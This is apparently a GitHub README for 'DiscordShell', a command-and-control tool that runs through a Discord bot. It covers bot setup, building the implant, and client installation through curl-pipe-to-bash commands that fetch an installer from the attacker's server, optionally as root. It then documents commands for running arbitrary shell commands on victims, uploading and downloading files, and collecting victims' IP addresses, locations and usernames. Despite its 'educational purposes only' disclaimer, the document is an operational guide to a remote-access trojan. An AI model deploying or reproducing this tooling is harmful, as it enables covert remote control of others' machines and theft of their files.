# DiscordShell

C2 hosted on Discord via use of the Discord Python API. Created by [Sid Lacy](https://github.com/lacysw) and [Nathan Burns](https://github.com/AlbinoGazelle).

The files contained in this repository are intended for educational purposes only. Malicious use of code hosted within this repository is not permitted.

## Screenshots

Instant notifications on client join.
![Instant notifications on client join.](/img/clientJoin.png)

Easy access to basic client information.
![Easy access to basic host information.](/img/clientHosts.png)

Client latency information request.
![Support for executing arbitraty non-interactive commands.](/img/clientPing.png)

[!] SHELL: Support for executing any arbitraty non-interactive commands.
![SHELL: Support for executing any arbitraty non-interactive commands.](/img/clientCommand.png)

Support for uploading files under 4MB to the client (Discord API limitations).
![Support for uploading files under 4MB to the client (Discord API limitations).](/img/clientUpload.png)

Support for downloading files under 4MB from the client (Discord API limitations).
![Support for uploading files under 4MB to the client (Discord API limitations).](/img/clientDownload.png)

At-will client deauthorization.
![Instant notifications on client join.](/img/clientKill.png)

## Setup

### Discord

1. Follow [these instructions](https://discordpy.readthedocs.io/en/stable/discord.html).
2. Save the bot token for later use.
3. Create a C2 channel in your discord, this is where the bot will accept commands. Copy this channels ID and save it for later.
4. Copy your user ID and save it for later use.

### Host

1. Edit the variables `apitoken`, `debug`, and `allowed_users` inside `shell.py` with the information you saved earlier.
2. Run `build.sh` to yield an executable.
3. Edit the variables `$srcip` and `$srcport` inside of `install.sh` to contain the IP address and port of the server hosting the shell.
4. Host the executable (`shell`) and `installer.sh` at `$scrip:$scrport`.

### Client

 - Execute `curl -s  http://$srcip:$srcport/installer.sh | bash` for a standard connection.
 - Execute `curl -s  http://$srcip:$srcport/installer.sh | sudo bash` for a root connection.

## Supported Features & Syntax

All supported commands are prefixed with `?`.
 - `?hosts`: Request the following information for every active client:
    - IP address; click to navigate instantly to whois.domaintools.com/${IP}
    - Alpha-2 country code of residence
    - Estimated location coordinates; click to instantly navigate to google.com/maps?q=${latitude},${longitude}
    - Detected operating system
    - EUID (permissions)
    - Username and hostname
    - The service provider of the internet connection
 - `?cmd ${client_id} ${command}`: Executes a command on a specified client. Command result will be returned in a discord message.
    - Example: `?cmd abcd1234 whoami`
    - Example: `?cmd abcd1234 ls -la`
 - `?download ${client_id} ${path}`: Download specified file from client. Data will be returned in a discord message, has a limitation of 4MB in non-boosted servers.
    - Example: `?download abcd1234 file.txt`
    - Example: `?download abcd1234 /home/user/picture.png`
 - `?upload ${client_id} ${path}`: Upload a file to a specified client. Status message will be returned in a discord message, has a limitation of 4MB in non-boosted servers.
    - Example: `?upload abcd1234 resource.sql`
    - Example: `?upload abcd1234 /usr/sbin/function.sh`
 - `?kill ${client_id}`: Terminate a specified client. Status message will be returned in a discord message.
    - Example: `?kill abcd1234`


## Plans

 - Better error handling.
 - Comprehensive logging.